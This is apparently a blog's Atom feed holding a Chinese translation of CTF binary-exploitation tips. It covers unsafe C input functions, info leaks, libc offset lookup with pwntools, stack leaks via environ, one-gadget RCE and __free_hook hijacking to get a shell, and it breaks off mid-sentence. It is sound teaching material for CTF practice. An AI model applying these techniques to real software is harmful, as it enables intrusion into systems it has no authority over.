<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>l0ser</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.zero-mk.github.io/"/>
  <updated>2018-12-31T16:24:12.406Z</updated>
  <id>http://www.zero-mk.github.io/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctf-pwn-tips-zh_CN</title>
    <link href="http://www.zero-mk.github.io/2018/12/31/CTF-pwn-tips-zh_CN/"/>
    <id>http://www.zero-mk.github.io/2018/12/31/CTF-pwn-tips-zh_CN/</id>
    <published>2018-12-31T08:39:34.000Z</published>
    <updated>2018-12-31T16:24:12.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Catalog"><a href="#Catalog" class="headerlink" title="Catalog"></a>Catalog</h1><ul><li><a href="http://#overflow" target="_blank" rel="noopener">Overflow</a></li><li><a href="#find-string-in-gdb">Find string in gdb</a></li><li><a href="#binary-service">Binary Service</a></li><li><a href="#find-specific-function-offset-in-libc">Find specific function offset in libc</a></li><li><a href="#find-binsh-or-sh-in-library">Find ‘/bin/sh’ or ‘sh’ in library</a></li><li><a href="#leak-stack-address">Leak stack address</a></li><li><a href="#fork-problem-in-gdb">Fork problem in gdb</a></li><li><a href="#secret-of-a-mysterious-section---tls">Secret of a mysterious section - .tls</a></li><li><a href="#predictable-rngrandom-number-generator">Predictable RNG(Random Number Generator)</a></li><li><a href="#make-stack-executable">Make stack executable</a></li><li><a href="#use-one-gadget-rce-instead-of-system">Use one-gadget-RCE instead of system</a></li><li><a href="#hijack-hook-function">Hijack hook function</a></li><li><a href="#use-printf-to-trigger-malloc-and-free">Use printf to trigger malloc and free</a></li><li><a href="#use-execveat-to-open-a-shell">Use execveat to open a shell</a></li></ul><h2 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h2><p>例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf[40]</span><br><span class="line">signed int num</span><br></pre></td></tr></table></figure></p><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%s&quot;, buf)</span><br></pre></td></tr></table></figure><ul><li><code>%s</code> 没有边界检查</li><li><strong>pwnable</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%39s"</span>, buf)</span><br></pre></td></tr></table></figure><ul><li><code>39s</code> 只从输入中获取39个字节，并将 NULL 字节放在输入的末尾。</li><li><strong>useless</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%40s"</span>, buf)</span><br></pre></td></tr></table></figure><ul><li>乍一看，这似乎是合理的。</li><li>它从输入中获取40字节，但它也将NULL字节放在输入的末尾。</li><li>但是,它有one-byte-overflow</li><li><strong>pwnable</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%d&quot;, &amp;num)</span><br><span class="line">alloca(num)</span><br></pre></td></tr></table></figure><pre><code>* 由于`alloca`从调用者的堆栈框架分配内存，因此有一条` sub esp, eax `指令来实现这一点。* 如果我们使num为负，它将有重叠的堆栈帧。* E.g. [Seccon CTF quals 2016 cheer_msg](https://github.com/ctfs/write-ups-2016/tree/master/seccon-ctf-quals-2016/exploit/cheer-msg-100)</code></pre><ul><li>使用num访问一些数据结构<ul><li>大多数情况下，程序只检查较高的边界，忘记使num无符号。</li><li>使num为负可以让我们覆盖一些重要的数据</li></ul></li></ul><h3 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gets(buf)</span><br></pre></td></tr></table></figure><ul><li>没有检查边界</li><li><strong>pwnable</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(buf, 40, stdin)</span><br></pre></td></tr></table></figure><ul><li>它只从输入中获取39个字节，并将NULL字节放在输入的末尾。</li><li><strong>useless</strong></li></ul><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(stdin, buf, 40)</span><br></pre></td></tr></table></figure><ul><li>它从输入中获取40字节，并且不将NULL字节放在输入的末尾。</li><li>这看起来很安全，但可能会有 <strong>information leak</strong>.</li><li><strong>leakable</strong></li></ul><p>E.g.</p><p><strong>memory layout</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdd00: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7fffffffdd10: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7fffffffdd20: 0x4141414141414141      0x00007fffffffe1cd</span><br></pre></td></tr></table></figure></p><ul><li>如果现在用<code>printf</code>或者<code>puts</code>来输出这个buf,它将一直输出到NULL byte.</li><li>在这种情况下，我们可以:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos;*40 + &apos;\xcd\xe1\xff\xff\xff\x7f&apos;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(buf, 1, 40, stdin)</span><br></pre></td></tr></table></figure><ul><li>几乎和<code>read</code>一样</li><li><strong>leakable</strong></li></ul><h3 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h3><p>假设还有另一个缓冲区:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf2[60]</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcpy(buf, buf2)</span><br></pre></td></tr></table></figure><ul><li>没有边界检查</li><li>buf2的大小可能比buf大</li><li>所以可能会buffer overflow</li><li><strong>pwnable</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strncpy(buf, buf2, 40)</span><br><span class="line">memcpy(buf, buf2, 40)</span><br></pre></td></tr></table></figure><ul><li>这个操作会把buf2前40 bytes复制到buf,但是不会再末尾添加NULL byte</li><li>因为结尾没有NULL byte, 也许可以 <strong>information leak</strong>.</li><li><strong>leakable</strong></li></ul><h3 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h3><p>假设有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf2[60]</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcat(buf, buf2)</span><br></pre></td></tr></table></figure><ul><li>strcat是将两个char类型连接。</li><li>如果buf不够大，可能会导致溢出。</li><li>它将NULL byte放在末尾，这可能会导致<strong>one-byte-overflow</strong>.</li><li>在某些情况下，我们可以使用这个NULL byte来更改堆栈地址或堆地址。</li><li><strong>pwnable</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strncat(buf, buf2, n)</span><br></pre></td></tr></table></figure><ul><li>和<code>strcat</code>相似, 但是有大小n限制</li><li><strong>pwnable</strong></li><li>E.g. <a href="https://github.com/ctfs/write-ups-2016/tree/master/seccon-ctf-quals-2016/exploit/jmper-300" target="_blank" rel="noopener">Seccon CTF quals 2016 jmper</a></li></ul><h2 id="Find-string-in-gdb"><a href="#Find-string-in-gdb" class="headerlink" title="Find string in gdb"></a>Find string in gdb</h2><p>在 <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf" target="_blank" rel="noopener">SSP</a>中, 我们需要找出argv[0]和输入缓冲区之间的偏移量。</p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><ul><li>Use <code>p/x ((char **)environ)</code> in gdb, and the address of argv[0] will be the <code>output - 0x10</code></li><li>在gdb中使用<code>p/x ((char **)environ)</code>， argv[0]的地址将是<code>output - 0x10</code></li></ul><p>E.g.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x (char **)environ</span><br><span class="line">$9 = 0x7fffffffde38</span><br><span class="line">(gdb) x/gx 0x7fffffffde38-0x10</span><br><span class="line">0x7fffffffde28: 0x00007fffffffe1cd</span><br><span class="line">(gdb) x/s 0x00007fffffffe1cd</span><br><span class="line">0x7fffffffe1cd: &quot;/home/naetw/CTF/seccon2016/check/checker&quot;</span><br></pre></td></tr></table></figure><h3 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb peda"></a><a href="https://github.com/longld/peda" target="_blank" rel="noopener">gdb peda</a></h3><ul><li>使用 <code>searchmem</code>搜索内存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">    searchmem pattern start end</span><br><span class="line">    searchmem pattern mapname</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ searchmem &quot;/home/naetw/CTF/seccon2016/check/checker&quot;</span><br><span class="line">Searching for &apos;/home/naetw/CTF/seccon2016/check/checker&apos; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">[stack] : 0x7fffffffe1cd (&quot;/home/naetw/CTF/seccon2016/check/checker&quot;)</span><br><span class="line">[stack] : 0x7fffffffed7c (&quot;/home/naetw/CTF/seccon2016/check/checker&quot;)</span><br><span class="line">[stack] : 0x7fffffffefcf (&quot;/home/naetw/CTF/seccon2016/check/checker&quot;)</span><br><span class="line">gdb-peda$ searchmem 0x7fffffffe1cd</span><br><span class="line">Searching for &apos;0x7fffffffe1cd&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">   libc : 0x7ffff7dd33b8 --&gt; 0x7fffffffe1cd (&quot;/home/naetw/CTF/seccon2016/check/checker&quot;)</span><br><span class="line">[stack] : 0x7fffffffde28 --&gt; 0x7fffffffe1cd (&quot;/home/naetw/CTF/seccon2016/check/checker&quot;)</span><br></pre></td></tr></table></figure><h2 id="Binary-Service"><a href="#Binary-Service" class="headerlink" title="Binary Service"></a>Binary Service</h2><p>不需要使用共享库的binary:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./binary -kl $ip $port</span><br></pre></td></tr></table></figure><p>需要使用共享库的binary:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc &apos;LD_PRELOAD=/path/to/libc.so ./binary&apos; -kl $ip $port</span><br><span class="line">ncat -vc &apos;LD_LIBRARY_PATH=/path/of/libc.so ./binary&apos; -kl $ip $port</span><br></pre></td></tr></table></figure><p>在此之后，您可以通过nc连接到二进制服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc $ip $port</span><br></pre></td></tr></table></figure></p><h2 id="Find-specific-function-offset-in-libc"><a href="#Find-specific-function-offset-in-libc" class="headerlink" title="Find specific function offset in libc"></a>Find specific function offset in libc</h2><p>如果我们成功地泄漏了某个函数的libc地址，我们可以通过用函数在libc地址减去该函数的偏移量来得到libc的基地址。</p><h3 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc名 | grep 函数名@</span><br></pre></td></tr></table></figure><p>E.g.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s libc-2.19.so | grep system@</span><br><span class="line">    620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">   1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure><h3 id="Automatically"><a href="#Automatically" class="headerlink" title="Automatically"></a>Automatically</h3><ul><li>使用 <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools</a></li></ul><p>E.g.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">system_off = libc.symbols[&apos;system&apos;]</span><br></pre></td></tr></table></figure><h2 id="Find-‘-bin-sh’-or-‘sh’-in-library"><a href="#Find-‘-bin-sh’-or-‘sh’-in-library" class="headerlink" title="Find ‘/bin/sh’ or ‘sh’ in library"></a>Find ‘/bin/sh’ or ‘sh’ in library</h2><p>先得到libc的基地址</p><h3 id="Manually-1"><a href="#Manually-1" class="headerlink" title="Manually"></a>Manually</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -s libc.so | less (search &apos;sh&apos;)</span><br><span class="line">strings -tx libc.so | grep /bin/sh</span><br></pre></td></tr></table></figure><h3 id="Automatically-1"><a href="#Automatically-1" class="headerlink" title="Automatically"></a>Automatically</h3><ul><li>使用 <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools</a></li></ul><p>E.g.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">...</span><br><span class="line">sh = base + next(libc.search(&apos;sh\x00&apos;))</span><br><span class="line">binsh = base + next(libc.search(&apos;/bin/sh\x00&apos;))</span><br></pre></td></tr></table></figure><p>译者注 : next(libc.search(<code>some_characters</code>)) 在libc找到包含 some_characters（字符串，汇编代码或者某个数值）的地址</p><h2 id="Leak-stack-address"><a href="#Leak-stack-address" class="headerlink" title="Leak stack address"></a>Leak stack address</h2><p><strong>constraints</strong>:</p><ul><li>libc的基地地址已经泄露了吗</li><li>可以泄露任意地址的内容吗</li></ul><p>有一个 symbol <code>environ</code> 在libc中,它的值与<code>main</code>函数的第三个参数<code>char **envp</code>相同。<br> char **envp ‘的值在堆栈上，因此我们可以使用这个 symbol泄漏堆栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) list 1</span><br><span class="line">1       #include &lt;stdlib.h&gt;</span><br><span class="line">2       #include &lt;stdio.h&gt;</span><br><span class="line">3</span><br><span class="line">4       extern char **environ;</span><br><span class="line">5</span><br><span class="line">6       int main(int argc, char **argv, char **envp)</span><br><span class="line">7       &#123;</span><br><span class="line">8           return 0;</span><br><span class="line">9       &#125;</span><br><span class="line">(gdb) x/gx 0x7ffff7a0e000 + 0x3c5f38</span><br><span class="line">0x7ffff7dd3f38 &lt;environ&gt;:       0x00007fffffffe230</span><br><span class="line">(gdb) p/x (char **)envp</span><br><span class="line">$12 = 0x7fffffffe230</span><br></pre></td></tr></table></figure><ul><li>当前的libc基地址是 <code>0x7ffff7a0e000</code></li><li><code>environ</code>在libc的偏移量为<code>0x3c5f38</code></li></ul><p>这本 <a href="https://www.gnu.org/software/libc/manual/html_node/Program-Arguments.html" target="_blank" rel="noopener">手册</a> 详细解释了 <code>environ</code></p><h2 id="Fork-problem-in-gdb"><a href="#Fork-problem-in-gdb" class="headerlink" title="Fork problem in gdb"></a>Fork problem in gdb</h2><p>当您使用<code>gdb</code>调试一个带有<code>fork()</code>函数的二进制文件时，您可以使用以下命令来确定要执行哪个进程(原始<code>gdb</code>的默认设置是父进程，而<code>gdb-peda</code>的默认设置是子进程):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode parent</span><br><span class="line">set follow-fork-mode child</span><br></pre></td></tr></table></figure><p>Alternatively, using <code>set detach-on-fork off</code>, we can then control both sides of each fork. Using <code>inferior X</code> where <code>X</code> is any of the numbers that show up for <code>info inferiors</code> will switch to that side of the fork. This is useful if both sides of the fork are necessary to attack a challenge, and the simple <code>follow</code> ones above aren’t sufficient.<br>或者，使用<code>set detach-on-fork off</code>，我们可以控制每个fork的两边。使用<code>inferior X</code>，其中<code>X</code>是出现在<code>info inferiors</code>中的任何一个数字，都会切换到fork的那一边。如果分支的两端都是攻击某个挑战所必需的，并且上面简单的<code>follow</code>操作还不够，那么这种方法非常有用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info inferiors</span><br><span class="line">  Num  Description       Executable</span><br><span class="line">* 1    xxxx              xxxxx</span><br><span class="line">  2    xxxx              xxxxx</span><br></pre></td></tr></table></figure></p><h2 id="Secret-of-a-mysterious-section-tls"><a href="#Secret-of-a-mysterious-section-tls" class="headerlink" title="Secret of a mysterious section - .tls"></a>Secret of a mysterious section - .tls</h2><p><strong>constraints</strong>:</p><ul><li>Need <code>malloc</code> function and you can malloc with arbitrary size</li><li>Arbitrary address leaking</li></ul><p>We make <code>malloc</code> use <code>mmap</code> to allocate memory(size 0x21000 is enough). In general, these pages will be placed at the address just before <code>.tls</code> section.</p><p>There is some useful information on <strong><code>.tls</code></strong>, such as the address of <code>main_arena</code>, <code>canary</code> (value of stack guard), and a strange <code>stack address</code> which points to somewhere on the stack but with a fixed offset.</p><p><strong>Before calling mmap:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7fecbfe4d000-7fecbfe51000 r--p 001bd000 fd:00 131210         /lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">7fecbfe51000-7fecbfe53000 rw-p 001c1000 fd:00 131210         /lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">7fecbfe53000-7fecbfe57000 rw-p 00000000 00:00 0</span><br><span class="line">7fecbfe57000-7fecbfe7c000 r-xp 00000000 fd:00 131206         /lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">7fecc0068000-7fecc006a000 rw-p 00000000 00:00 0              &lt;- .tls section</span><br><span class="line">7fecc0078000-7fecc007b000 rw-p 00000000 00:00 0</span><br><span class="line">7fecc007b000-7fecc007c000 r--p 00024000 fd:00 131206         /lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">7fecc007c000-7fecc007d000 rw-p 00025000 fd:00 131206         /lib/x86_64-linux-gnu/ld-2.24.so</span><br></pre></td></tr></table></figure><p><strong>After call mmap:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7fecbfe4d000-7fecbfe51000 r--p 001bd000 fd:00 131210         /lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">7fecbfe51000-7fecbfe53000 rw-p 001c1000 fd:00 131210         /lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">7fecbfe53000-7fecbfe57000 rw-p 00000000 00:00 0</span><br><span class="line">7fecbfe57000-7fecbfe7c000 r-xp 00000000 fd:00 131206         /lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">7fecc0045000-7fecc006a000 rw-p 00000000 00:00 0              &lt;- memory of mmap + .tls section</span><br><span class="line">7fecc0078000-7fecc007b000 rw-p 00000000 00:00 0</span><br><span class="line">7fecc007b000-7fecc007c000 r--p 00024000 fd:00 131206         /lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">7fecc007c000-7fecc007d000 rw-p 00025000 fd:00 131206         /lib/x86_64-linux-gnu/ld-2.24.so</span><br></pre></td></tr></table></figure><h2 id="Predictable-RNG-Random-Number-Generator"><a href="#Predictable-RNG-Random-Number-Generator" class="headerlink" title="Predictable RNG(Random Number Generator)"></a>Predictable RNG(Random Number Generator)</h2><p>When the binary uses the RNG to make the address of important information or sth, we can guess the same value if it’s predictable.</p><p>Assuming that it’s predictable, we can use <a href="https://docs.python.org/2/library/ctypes.html" target="_blank" rel="noopener">ctypes</a> which is a build-in module in Python.</p><p><strong>ctypes</strong> allows calling a function in DLL(Dynamic-Link Library) or Shared Library.</p><p>Therefore, if binary has an init_proc like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">srand(time(NULL));</span><br><span class="line">while(addr &lt;= 0x10000)&#123;</span><br><span class="line">    addr = rand() &amp; 0xfffff000;</span><br><span class="line">&#125;</span><br><span class="line">secret = mmap(addr,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS ,-1,0);</span><br><span class="line">if(secret == -1)&#123;</span><br><span class="line">    puts(`mmap error`);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then we can use <strong>ctypes</strong> to get the same value of addr.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">LIBC = ctypes.cdll.LoadLibrary(&apos;/path/to/dll&apos;)</span><br><span class="line">LIBC.srand(LIBC.time(0))</span><br><span class="line">addr = LIBC.rand() &amp; 0xfffff000</span><br></pre></td></tr></table></figure><h2 id="Make-stack-executable"><a href="#Make-stack-executable" class="headerlink" title="Make stack executable"></a>Make stack executable</h2><ul><li><a href="http://radare.today/posts/defeating-baby_rop-with-radare2/" target="_blank" rel="noopener">link1</a></li><li><a href="https://sploitfun.wordpress.com/author/sploitfun/" target="_blank" rel="noopener">link2</a></li><li>Haven’t read yet orz</li></ul><h2 id="Use-one-gadget-RCE-instead-of-system"><a href="#Use-one-gadget-RCE-instead-of-system" class="headerlink" title="Use one-gadget-RCE instead of system"></a>Use one-gadget-RCE instead of system</h2><p><strong>constraints</strong>:</p><ul><li>有libc的基本地址</li><li>任意地址写</li></ul><p>几乎每个pwnable挑战都需要在攻击结束时调用<code>system(&quot;/bin/sh&quot;)</code>，但是如果我们想调用它，我们必须操纵参数，当然，还需要劫持一些函数来调用’<code>system</code>。如果我们不能操纵参数怎么办?</p><p>使用 <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf" target="_blank" rel="noopener">one-gadget-RCE</a>!</p><p>用 <strong>one-gadget-RCE</strong>, 我们就劫持 <code>.got.plt</code> 或者我们可以用它来控制eip 使程序跳转到 <strong>one-gadget</strong>, 但是在使用它之前需要满足一些constraint<br>libc中有很多<strong>one-gadgets</strong>. 每个都有不同的constraints，但它们是相似的。每个constraints都与寄存器的状态有关。</p><p>E.g.</p><ul><li>ebx 在libc里的地址是 <code>rw-p</code> 的</li><li><code>[esp+0x34] == NULL</code></li></ul><p>我们如何得到这些constraints? 这里有一个有效的工具 <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a> !!!!</p><p>如果我们能满足这些constraints, 我们就可以轻易getshell</p><h2 id="Hijack-hook-function"><a href="#Hijack-hook-function" class="headerlink" title="Hijack hook function"></a>Hijack hook function</h2><p><strong>constraints</strong>:</p><ul><li>有libc基地址</li><li>任意地址写</li><li>程序有用到 <code>malloc</code>, <code>free</code> or <code>realloc</code></li></ul><p>By manual:</p><blockquote><p>原文:<br>The GNU C Library lets you modify the behavior of <code>malloc</code>, <code>realloc</code>, and <code>free</code> by specifying appropriate hook functions. You can use these hooks to help you debug programs that use dynamic memory allocation, for example.<br>译文:<br>GNU C库允许您通过指定适当的hook函数来修改<code>malloc</code>、<code>realloc</code>和<code>free</code>的行为。例如，您可以使用这些hook来帮助调试使用动态内存分配的程序。</p></blockquote><p>malloc.h中声明了一些hook变量。它们的默认值是<code>0x0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__malloc_hook</span><br><span class="line">__free_hook</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>因为它们用于帮助用户调试程序，所以它们在执行的时候是可写的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf77228e0 &lt;__free_hook&gt;:       0x00000000</span><br><span class="line">0xf7722000 0xf7727000 rw-p      mapped</span><br></pre></td></tr></table></figure><p>这是malloc.c的<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener">源码</a>.下面我使用 <code>__libc_free</code>来演示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void (*hook) (void *, const void *) = atomic_forced_read (__free_hook);</span><br><span class="line">if (__builtin_expect (hook != NULL, 0))</span><br><span class="line">&#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (0));</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它检查<code>__free_hook</code>的值。如果不是NULL，它将首先调用hook函数。在这里，我们希望使用<strong>one-gadget-RCE</strong>。由于hook函数是在libc中调用的，所以通常满足<strong>one-gadget</strong>的constraints。</p><h2 id="Use-printf-to-trigger-malloc-and-free"><a href="#Use-printf-to-trigger-malloc-and-free" class="headerlink" title="Use printf to trigger malloc and free"></a>Use printf to trigger malloc and free</h2><p>查看<code>printf</code>函数的源码,有几个地方可能会触发<code>malloc</code>. 拿 <a href="https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#1470" target="_blank" rel="noopener">vfprintf.c line 1470</a> 来做例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#define EXTSIZ 32</span><br><span class="line">enum &#123; WORK_BUFFER_SIZE = 1000 &#125;;</span><br><span class="line"></span><br><span class="line">if (width &gt;= WORK_BUFFER_SIZE - EXTSIZ)</span><br><span class="line">&#123;</span><br><span class="line">    /* 我们必须使用一个特殊的缓冲区。  */</span><br><span class="line">    size_t needed = ((size_t) width + EXTSIZ) * sizeof (CHAR_T);</span><br><span class="line">    if (__libc_use_alloca (needed))</span><br><span class="line">        workend = (CHAR_T *) alloca (needed) + width + EXTSIZ;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        workstart = (CHAR_T *) malloc (needed);</span><br><span class="line">        if (workstart == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            done = -1;</span><br><span class="line">            goto all_done;</span><br><span class="line">        &#125;</span><br><span class="line">        workend = workstart + width + EXTSIZ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can find that <code>malloc</code> will be triggered if the width field is large enough.(Of course, <code>free</code> will also be triggered at the end of printf if <code>malloc</code> has been 